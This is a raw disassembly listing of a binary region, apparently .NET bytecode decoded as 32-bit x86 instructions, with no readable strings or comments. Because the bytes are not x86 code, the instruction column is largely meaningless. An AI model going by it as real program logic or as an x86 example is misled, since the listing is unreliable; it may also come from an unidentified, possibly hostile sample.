  4036ab:	78 00                	js     0x4036ad
  4036ad:	00 0a                	add    %cl,(%edx)
  4036af:	73 79                	jae    0x40372a
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 30             	es jb  0x403702
  4036d2:	24 00                	and    $0x0,%al
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	42                   	inc    %edx
  40372d:	24 00                	and    $0x0,%al
  40372f:	70 28                	jo     0x403759
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 ac 21 00       	and    $0x21ac72,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 48                	jb     0x4037c2
  40377a:	24 00                	and    $0x0,%al
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 5e 24 00       	and    $0x245e72,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 68 24 00       	and    $0x246872,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 72 24 00       	and    $0x247272,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 78                	jb     0x403845
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 8c             	or     -0x74(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	90                   	nop
  4037ea:	24 00                	and    $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	9a 24 00 70 6f 95 00 	lcall  $0x95,$0x6f700024
  4037f5:	00 0a                	add    %cl,(%edx)
  4037f7:	72 a6                	jb     0x40379f
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	b2 24                	mov    $0x24,%dl
  4037ff:	00 70 6f             	add    %dh,0x6f(%eax)
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 be 24 00       	and    $0x24be72,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 c8 24 00       	and    $0x24c872,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 d8 24 00       	and    $0x24d872,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 e4             	or     -0x1c(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	d8 24 00             	fsubs  (%eax,%eax,1)
  403860:	70 6f                	jo     0x4038d1
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 ee             	or     -0x12(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	68 24 00 70 6f       	push   $0x6f700024
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 fa 24 00       	and    $0x24fa72,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 12 25 00       	and    $0x251272,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 24 25 00       	and    $0x252472,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 38 25 00       	and    $0x253872,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 4c 25 00       	and    $0x254c72,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 a6                	jb     0x40389b
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 56 25 00       	and    $0x255672,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 62             	adc    %esi,0x62(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 68             	or     0x68(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 94             	or     -0x6c(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 d2    	or     0xd2720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 ea                	jb     0x403a00
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 f2             	add    %dh,-0xe(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 ea                	jb     0x403a31
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 a6             	add    %dh,-0x5a(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
